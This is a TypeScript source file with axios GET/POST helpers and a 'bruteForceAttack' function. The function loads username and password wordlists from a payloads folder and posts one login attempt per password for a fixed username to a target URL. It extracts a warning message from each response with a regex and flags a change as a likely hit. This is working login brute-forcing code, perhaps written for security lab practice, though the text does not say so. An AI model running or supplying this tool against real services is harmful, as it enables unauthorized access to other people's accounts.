import axios, { AxiosRequestConfig } from 'axios';
import { readFileSync } from 'fs';
import readline from 'readline';
const rl = readline.createInterface({
	input: process.stdin,
	output: process.stdout,
});


export const getRequest = (targetURL: string, config?: AxiosRequestConfig) => {
	axios
		.get(targetURL, config)
		.then(response => {
			// return response;
			// console.log('REQUEST CONFIG:\n', response.config);
			// console.log('REQUEST:\n', response.request);
			console.log('RESPONSE STATUS:\n', response.status);
			console.log('RESPONSE STATUSTEXT:\n', response.statusText);
			console.log('RESPONSE HEADER:\n', response.headers);
			console.log('RESPONSE DATA:\n', response.data);
		})
		.catch(err => {
			console.log(err);
		});
};

export const postRequest = (targetURL: string, data?: any, config?: AxiosRequestConfig) => {
	axios
		.post(targetURL, data, config)
		.then(response => {
			// return response;
			console.log('RESPONSE STATUS:\n', response.status);
			console.log('RESPONSE STATUSTEXT:\n', response.statusText);
			console.log('RESPONSE HEADER:\n', response.headers);
			console.log('RESPONSE DATA:\n', response.data);
		})
		.catch(err => {
			console.log(err);
		});
};

export const bruteForceAttack = async (targetURL: string) => {

	const payload1: string[] = readFileSync('src/payloads/usernames.txt').toString().split('\n');
	const payload2: string[] = readFileSync('src/payloads/passwords.txt').toString().split('\n');
	const config: AxiosRequestConfig = undefined as any;
	const extractRegex: string = '-warning>(.*?)</p>\n';
	let extractedAnswer: string = '';
	let extractedAnswerCache: string = '';

	// if (payload1.length == payload2.length) return;

	for (let i = 0; i < payload1.length; i++) {
		// const data: string = `username=${payload1[i]}&password=pass`;
		const data: string = `username=app01&password=${payload2[i]}`;


		await axios
			.post(targetURL, data, config)
			.then(response => {
				extractedAnswer = `${response.data.match(extractRegex)[1]}`;
				console.log(
					`
	Try #${i + 1} | data: '${data}'
	RESPONSE: \n${extractedAnswer}
						`,
				);
			/*
				console.log('RESPONSE STATUS:\n', response.status);
				console.log('RESPONSE STATUSTEXT:\n', response.statusText);
				console.log('RESPONSE HEADER:\n', response.headers);
				console.log('RESPONSE DATA:\n', response.data);
			*/
			})
			.catch(err => {
				console.log(err);
			});
		if ((i !== 0) && (extractedAnswerCache !== extractedAnswer)) {
			console.log('CHANGE FOUND\n');
		} else {
			extractedAnswerCache = extractedAnswer;
		}
	}
};